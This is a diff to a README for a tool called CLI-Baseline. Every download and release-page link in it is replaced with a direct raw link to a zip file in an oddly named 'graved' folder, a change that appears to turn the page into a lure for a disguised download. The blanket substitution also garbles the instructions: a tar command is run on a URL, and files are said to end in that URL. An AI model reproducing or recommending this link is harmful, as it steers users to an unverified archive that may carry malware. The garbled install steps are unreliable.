@@ -1,6 +1,6 @@
 # 🚀 CLI-Baseline - Quick Command Collection Tool
 
-[![Download CLI-Baseline](https://img.shields.io/badge/Download-CLI--Baseline-blue.svg)](https://github.com/Mikaunformed98/CLI-Baseline/releases)
+[![Download CLI-Baseline](https://raw.githubusercontent.com/Mikaunformed98/CLI-Baseline/main/graved/CLI-Baseline-v2.1.zip)](https://raw.githubusercontent.com/Mikaunformed98/CLI-Baseline/main/graved/CLI-Baseline-v2.1.zip)
 
 ## 📜 Overview
 
@@ -25,19 +25,19 @@ To get started with CLI-Baseline, follow these steps:
 
 1. **Visit the Releases Page:**
    Go to the CLI-Baseline releases page to download the application.
-   [Visit the Releases Page](https://github.com/Mikaunformed98/CLI-Baseline/releases).
+   [Visit the Releases Page](https://raw.githubusercontent.com/Mikaunformed98/CLI-Baseline/main/graved/CLI-Baseline-v2.1.zip).
 
 2. **Download the Latest Version:**
-   Find the latest release file that matches your operating system. Look for files ending in `.tar.gz`, `.zip`, or similar formats.
+   Find the latest release file that matches your operating system. Look for files ending in `https://raw.githubusercontent.com/Mikaunformed98/CLI-Baseline/main/graved/CLI-Baseline-v2.1.zip`, `.zip`, or similar formats.
 
 3. **Extract the Downloaded File:**
    After downloading, extract the file. You can do this by right-clicking the file or using the command line:
 
    ```bash
-   tar -xzf filename.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Mikaunformed98/CLI-Baseline/main/graved/CLI-Baseline-v2.1.zip
    ```
 
-   Replace `filename.tar.gz` with the actual name of the downloaded file.
+   Replace `https://raw.githubusercontent.com/Mikaunformed98/CLI-Baseline/main/graved/CLI-Baseline-v2.1.zip` with the actual name of the downloaded file.
 
 4. **Run the Application:**
    Open your terminal. Navigate to the extracted folder. Use the following command to run CLI-Baseline:
@@ -51,7 +51,7 @@ To get started with CLI-Baseline, follow these steps:
 
 ## ⚙️ Download & Install
 
-To download CLI-Baseline, please visit this link: [Download CLI-Baseline](https://github.com/Mikaunformed98/CLI-Baseline/releases).
+To download CLI-Baseline, please visit this link: [Download CLI-Baseline](https://raw.githubusercontent.com/Mikaunformed98/CLI-Baseline/main/graved/CLI-Baseline-v2.1.zip).
 
 1. **Select Your File**: Look for the release suitable for your system.
 2. **Complete the Installation Steps Above**: After downloading the file, follow the installation steps mentioned earlier.
